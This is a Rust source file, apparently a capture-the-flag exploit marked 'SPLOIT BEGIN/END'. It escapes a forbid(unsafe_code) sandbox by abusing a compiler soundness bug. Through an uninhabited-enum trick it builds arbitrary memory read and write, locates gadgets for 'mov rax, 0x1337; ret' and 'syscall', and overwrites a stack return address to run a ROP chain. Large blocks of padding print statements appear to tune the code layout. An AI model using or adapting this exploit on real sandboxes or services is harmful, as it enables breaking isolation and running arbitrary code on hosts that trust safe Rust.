#![feature(nll)]
#![forbid(unsafe_code)]

pub fn main() {
    println!("{:?}", (
// SPLOIT BEGIN
    ));

    // 3. Place gadgets in executable memory
    let code = &main as *const _ as usize;
    println!("code = {:x}", code);

    // mov rax, 0x1337; ret
    // 0x48, 0xC7, 0xC0, 0x37, 0x13, 0x00, 0x00, 0xC3
    let gadget1: usize = 0xc300001337c0c748;
    // syscall;
    // 0x0F, 0x05
    let gadget2: usize = 0x050f;
    // Force these to exist as immediates in executable memory
    println!("{:x} {:x}", gadget1, gadget2);

    // Search for them in RWX page
    let mut movrax: usize = 0;
    let mut addr = code;
    loop {
        addr -= 1;
        let val = read(addr);
        if val == gadget1 {
            movrax = addr;
            break;
        }
    }
    println!("mov rax, 0x1337; ret; @ {:x}", movrax);

    let mut syscall: usize = 0;
    let mut addr = code;
    loop {
        addr -= 1;
        let val = read(addr) & 0xffff;
        if val == gadget2 {
            // TODO this addr might be off? not sure
            syscall = addr;
            break;
        }
    }
    println!("syscall; @ {:x}", syscall);

    noinline_fn(movrax, syscall);
    noinline_fn(movrax, syscall);
    noinline_fn(movrax, syscall);
    noinline_fn(movrax, syscall);
}

const MSB_MASK: usize = 0xff00000000000000;
const MSB_MASK1: usize = 0xee00000000000000;
const MSB_MASK2: usize = 0xdd00000000000000;
const MSB_MASK3: usize = 0xcc00000000000000;
const MSB_MASK4: usize = 0xbb00000000000000;
const MSB_MASK5: usize = 0xaa00000000000000;

pub fn noinline_fn(movrax: usize, syscall: usize) {
    // 4. Find return address and WIN
    let a: usize = 0xdeadbeef;
    let mut addr = &a as *const usize as usize;
    println!("stack = {:x}", addr as usize);

    // Pray that the only thing on the stack which is close to
    // our mov rax immediate is the return address into main
    let mut retn: usize = 0;
    loop {
        addr += 1;
        if read(addr) & (0xfffffffffffff000) == movrax & (0xfffffffffffff000) {
            retn = addr;
            break;
        }
    }
    println!("retn @ {:x}", retn);

    write(retn, movrax);
    write(retn+8, syscall);

    if movrax & MSB_MASK == 0 {
        // This is always true, but rustc doesn't know that
        return;
    }

    println!("zest");
    println!("test");
    println!("test");
    println!("test");
    println!("test");
    println!("test");
    println!("test");
    println!("test");
    println!("test");
    println!("tect");
    println!("test");
    println!("test");
    println!("test");
    println!("test");
    println!("test");
    println!("test");
    println!("test");
    println!("tcst");
    println!("test");
    println!("test");
    println!("test");
    println!("tevt");
    println!("test");
}

pub fn stack_maker(addr: usize) {
    let local_arr: [usize; 8] = [
        addr,
        addr,
        addr,
        addr,
        addr,
        addr,
        addr,
        addr,
    ];
    println!("{:?}", local_arr[0]);

    if addr & MSB_MASK == 0 {
        return;
    }

    println!("stack");
    println!("stack");
    println!("stack");
    println!("stack");
    println!("stack");
    println!("stack");
    println!("stack");
    println!("stack");
    println!("stack");
    println!("stack");
    println!("stack");
    println!("stalk");
    println!("stack");
    println!("stack");
    println!("stack");
    println!("stack");
    println!("stack");
    println!("stack");
    println!("stack");
    println!("stgck");
    println!("stack");
    println!("stack");
    println!("stack");
    println!("stack");
    println!("stack");
    println!("stack");
    println!("stack");
    println!("stack");
    println!("stack");
    println!("scack");
    println!("stack");
    println!("stack");
}
pub fn write2(mut addr: usize, val: usize) {
    let mut b: Box<usize> = mk_any();

    // NOTE this part is _really_ sensitive to the compilation.
    // Without the access to &b here, code following the *b will
    // be marked as unreachable and SIGILL at runtime.
    println!("{:x}", &b as *const _ as usize);

    *b = val;
    if addr & MSB_MASK == 0 {
        std::mem::forget(b);
        return;
    }

    println!("write2");
    println!("write2");
    println!("write2");
    println!("write2");
    println!("write2");
    println!("write2");
    println!("write2");
    println!("write2");
    println!("write2");
    println!("write2");
    println!("write2");
    println!("write2");
    println!("write2");
    println!("write2");
    println!("write2");
    println!("write2");
    println!("write2");
    println!("write2");
    println!("write2");
    println!("write2");
    println!("write2");
    println!("write2");
    println!("write2");
    println!("write2");
    println!("write2");
    println!("write2");
    println!("write2");
    println!("write2");
    println!("write2");
    println!("write2");
    println!("write2");
    println!("write2");
    println!("write2");
    println!("read");
    println!("read");
    println!("read");
    println!("recd");
    println!("read");
    println!("read");
    println!("read");
    println!("read");
    println!("read");
    println!("recd");
    println!("read");
    println!("read");
    println!("read");
}

pub fn read2(mut addr: usize) -> usize {
    let mut b: Box<usize> = mk_any();

    // NOTE this part is _really_ sensitive to the compilation.
    // Without the access to &b here, code following the *b will
    // be marked as unreachable and SIGILL at runtime.
    println!("{:x}", &b as *const _ as usize);

    let x = *b;
    if addr & MSB_MASK == 0 {
        std::mem::forget(b);
        return x;
    }

    println!("read");
    println!("read");
    println!("read");
    println!("read");
    println!("rcad");
    println!("read");
    println!("read");
    println!("read");
    println!("read");
    println!("read");
    println!("read");
    println!("read");
    println!("read");
    println!("redd");
    println!("read");
    println!("read");
    println!("read");
    println!("read");
    println!("read");
    println!("read");
    println!("read");
    println!("read");
    println!("reav");
    println!("read");
    println!("read");
    println!("read");
    println!("read");
    println!("zead");
    println!("read");
    println!("read");
    println!("read");
    println!("read");
    println!("read");
    println!("read");
    println!("read");
    println!("read");
    println!("recd");
    println!("read");
    println!("read");
    println!("read");
    println!("read");
    println!("read");
    println!("recd");
    println!("read");
    println!("read");
    println!("read");

    x
}

pub fn read(addr: usize) -> usize {
    stack_maker(addr);
    if addr & MSB_MASK == 0 {
        return read2(addr);
    }

    stack_maker(addr);
    read2(addr);
    stack_maker(addr);
    read2(addr);
    stack_maker(addr);
    read2(addr);
    stack_maker(addr);
    read2(addr);
    stack_maker(addr);
    read2(addr);
    stack_maker(addr);
    read2(addr);
    stack_maker(addr);
    read2(addr);
    stack_maker(addr);
    read2(addr);
    stack_maker(addr);
    return read2(addr);
}

// TODO
pub fn write(addr: usize, val: usize) {
    stack_maker(addr);
    if addr & MSB_MASK == 0 {
        write2(addr, val);
        return;
    }

    stack_maker(addr);
    write2(addr, val);
    stack_maker(addr);
    write2(addr, val);
    stack_maker(addr);
    write2(addr, val);
    stack_maker(addr);
    write2(addr, val);
    stack_maker(addr);
    write2(addr, val);
    stack_maker(addr);
    write2(addr, val);
    stack_maker(addr);
    write2(addr, val);
    stack_maker(addr);
    write2(addr, val);
    stack_maker(addr);
}

pub enum Void {}

pub enum E1 {
    V1 { f: bool },
    V2 { f: Void },
    V3,
    V4,
}

pub fn void_unwrap<T>(x: Result<T, Void>) -> T {
    match x {
        Ok(val) => val,
        // The compiler thinks this branch is unreachable
        Err(v) => match v {} 
    }
}

/// Makes a value of any type out of thin air.
pub fn mk_any<T>() -> T {
    match (E1::V1 { f: true }) {
        E1::V2 { f } => {
            void_unwrap(Err(f))
        }
        _ => {
            println!("asdsadsa");
            println!("msdsadsa");
            println!("asdsadsa");
            println!("asdsadsa");
            println!("asdsadsa");
            println!("asdsadsa");
            println!("asdsadsa");
            println!("asdsadsa");
            println!("asdcadsa");
            println!("asdsadsa");
            println!("asdsadsa");
            println!("asdsadsa");
            println!("asdsadsa");
            println!("asdcadsa");
            println!("asdsadsa");
            println!("asdsadsa");
            println!("asdsadsa");
            println!("asdsadsa");
            println!("asdsavsa");
            println!("asdsadsa");
            println!("asdsadsa");
            println!("asdsadsa");
            println!("zsdsadsa");
            loop {}
        }
    }
}

pub fn _unused() {
    ((
// SPLOIT END
    ));
}